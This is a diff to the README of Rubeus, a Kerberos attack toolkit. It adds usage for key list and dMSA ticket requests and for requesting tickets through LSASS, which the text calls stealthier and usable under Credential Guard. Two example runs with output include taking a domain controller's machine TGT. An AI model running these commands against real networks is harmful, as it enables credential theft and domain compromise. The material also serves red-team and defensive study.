@@ -83,7 +83,7 @@ Rubeus is licensed under the BSD 3-Clause license.
       | |  \ \| |_| | |_) ) ____| |_| |___ |
       |_|   |_|____/|____/|_____)____/(___/
 
-      v2.3.1
+      v2.3.3
 
 
      Ticket requests and renewals:
@@ -114,6 +114,12 @@ Rubeus is licensed under the BSD 3-Clause license.
 
        Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
             Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]
+	
+	Retrieve a service ticket using the Kerberos Key List Request options:
+        	Rubeus.exe asktgs /keyList /service:KRBTGT_SPN </ticket:BASE64 | /ticket:FILE.KIRBI> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]
+
+	Retrieve a delegated managed service account ticket:
+        	Rubeus.exe asktgs /dmsa /opsec /service:KRBTGT_SPN /targetuser:DMSA_ACCOUNT$ </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER_Win2025] [/outfile:FILENAME] [/ptt] [/nowrap] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]
 
         Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
             Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]
@@ -562,6 +568,8 @@ Using a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows
 
 The `/keyList` flag was implemented for Kerberos [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). These requests must utilise a forged partial TGT from a read-only domain controller in the `/ticket:BASE64|FILE.KIRBI` parameter, further details on this forged TGT in the [golden](#golden) section. Furthermore, the `/spn:x` field must be set to the KRBTGT SPN within the domain, eg. KRBTBT/domain.local.
 
+The **asktgs** action also supports requesting service tickets via the Kerberos authentication package using LSASS. This mode of operation can be enabled by omitting the `/ticket` argument. By default, the TGT associated with the current logon session is used.  An alternative logon session can be targetted by supplying the `/luid:xxx` argument.  Local administrator privileges are required when targetting other logon sessions. Currently, only simple service tickets can be requested via LSASS.  Arguments for features such as S4U2Self, U2U, key list and KDC proxy are ingnored.  Requesting service tickets via LSASS can often be more opsec friendly, since Kerberos traffic will originate from LSASS.  This mode is also required for scenarios where Credential Guard / Remote Credential Guard is active, since dumping TGT's with credential guard is not possible.      
+
 Requesting a TGT for dfm.a and then using that ticket to request a service ticket for the "LDAP/primary.testlab.local" and "cifs/primary.testlab.local" SPNs:
 
     C:\Rubeus>Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe
@@ -944,6 +952,70 @@ Using PKINIT to request a TGT and then requesting a user-to-user service ticket 
           Signature            : 6CF688E02147BEEC168E0125 (UNVALIDATED)
 
 **Note The `/asrepkey` from the TGT retrival must be passed to decrypted the CredentialData section where the NTLM hash is stored but the `/servicekey` argument is not required here as the session key from the TGT is being used because it is a user-to-user request.
+
+Requesting a service ticket using the current logged on session:
+```
+Rubeus.exe asktgs /service:LDAP/dc.ghostpack.local /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGS
+
+[=] Requesting service ticket via LSA authentication package 2 using handle 0x9625072
+[*] base64(ticket.kirbi):
+
+      doIGvDCCBrigAwIBBaEDAg(..snip..)
+
+  ServiceName              :  LDAP/dc.ghostpack.local
+  ServiceRealm             :  GHOSTPACK.LOCAL
+  UserName                 :  CCob (NT_PRINCIPAL)
+  UserRealm                :  GHOSTPACK.LOCAL
+  StartTime                :  25/02/2025 09:08:11
+  EndTime                  :  25/02/2025 18:48:39
+  RenewTill                :  03/03/2025 12:47:40
+  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  k2xUOHFN1Xg(...snip...)
+```
+
+Requesting local computer account TGT via renewal. Requires local administrator access.  If credential guard is present, ticket use will not be possible away from the host. 
+```
+Rubeus.exe asktgs /service:krbtgt/ghostpack.local /luid:0x3e7
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGS
+
+[=] Requesting service ticket via LSA authentication package 2 using handle 0x10441184
+[*] base64(ticket.kirbi):
+
+      doIGuTCCBrWg(...snip...)IFhb3MuZGV2
+
+  ServiceName              :  krbtgt/ghostpack.local
+  ServiceRealm             :  GHOSTPACK.LOCAL
+  UserName                 :  DC$ (NT_PRINCIPAL)
+  UserRealm                :  GHOSTPACK.LOCAL
+  StartTime                :  25/02/2025 09:18:37
+  EndTime                  :  25/02/2025 11:35:10
+  RenewTill                :  02/03/2025 10:35:06
+  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  k2xUOHFN1Xg(...snip...)
+```
 
 ### renew
 
@@ -1965,7 +2037,7 @@ Creating a diamond TGT using the tgtdeleg trick:
     [*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
     [*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/Earth-DC.marvel.local'
     [+] Kerberos GSS-API initialization success!
-    [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+    [+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
     [*] Found the AP-REQ delegation ticket in the GSS-API output.
     [*] Authenticator etype: aes256_cts_hmac_sha1
     [*] Extracted the service ticket session key from the ticket cache: imNrWVWRhlB61dUk5EWEdQL7DgqBQ/UckUs9pBvw6JU=
@@ -2896,7 +2968,7 @@ If automatic target/domain extraction is failing, a known SPN of a service confi
     [*] No target SPN specified, attempting to build 'HOST/dc.domain.com'
     [*] Initializing Kerberos GSS-API w/ fake delegation for target 'HOST/PRIMARY.testlab.local'
     [+] Kerberos GSS-API initialization success!
-    [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+    [+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
     [*] Found the AP-REQ delegation ticket in the GSS-API output.
     [*] Authenticator etype: aes256_cts_hmac_sha1
     [*] Extracted the service ticket session key from the ticket cache: YnEFxPfqw3LdfNvLtdFfzaFf7zG3hG+HNjesy+6R+ys=
